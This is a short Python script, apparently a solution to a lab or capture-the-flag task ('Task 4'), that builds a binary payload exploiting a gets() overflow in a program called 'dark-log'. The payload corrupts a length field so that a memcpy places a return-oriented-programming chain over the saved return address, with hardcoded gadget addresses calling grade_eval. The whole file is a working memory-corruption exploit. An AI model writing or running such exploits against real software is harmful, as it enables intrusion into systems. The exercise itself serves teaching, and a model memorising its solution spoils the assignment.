#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log (stack-canary bypass).

"""
import struct
import sys

# Fixed (non-PIE) .text addresses -- no ASLR/stack/libc dependence.
POP_RDI_RET = 0x4018A3  # 5f c3        pop rdi ; ret   (inside __libc_csu_init+0x63)
RET         = 0x4018A4  # c3           ret             (alignment gadget)
GRADE_EVAL  = 0x401677  # grade_eval(int grade)

EXPRESSION_SIZE = 128   # sizeof(f.expression) == memcpy length
LEN_OFFSET = 0x100      # expression + 0x100 == rbp-0x20 == &f.len
LEN_VALUE = 0xA8        # 0xa8 -> memcpy dest = rbp-0xa0 + 0xa8 = rbp+8


def build_payload():
    """Return the 260-byte payload for ``dark-log < payload``."""
    chain = b"".join([
        struct.pack("<Q", POP_RDI_RET),   # 0x00
        struct.pack("<Q", 4),             # 0x08: edi = 4 -> prints target
        struct.pack("<Q", RET),           # 0x10: align rsp for grade_eval
        struct.pack("<Q", GRADE_EVAL),    # 0x18
        struct.pack("<Q", 0),             # 0x20: grade_eval returns to NULL
    ])

    # expression[] (memcpy source, becomes the ROP chain at rbp+8)
    payload = chain.ljust(EXPRESSION_SIZE, b"B")
    # logMsg[] / padding (copied from expression[128..], unused filler)
    payload += b"A" * EXPRESSION_SIZE
    # f.len, overwritten through the gets() overflow: little endian 0xa8
    payload += struct.pack("<I", LEN_VALUE)

    assert len(payload) == LEN_OFFSET + 4, len(payload)
    assert b"\n" not in payload, "gets() would stop early"
    return payload


def main():
    sys.stdout.buffer.write(build_payload())


if __name__ == "__main__":
    main()
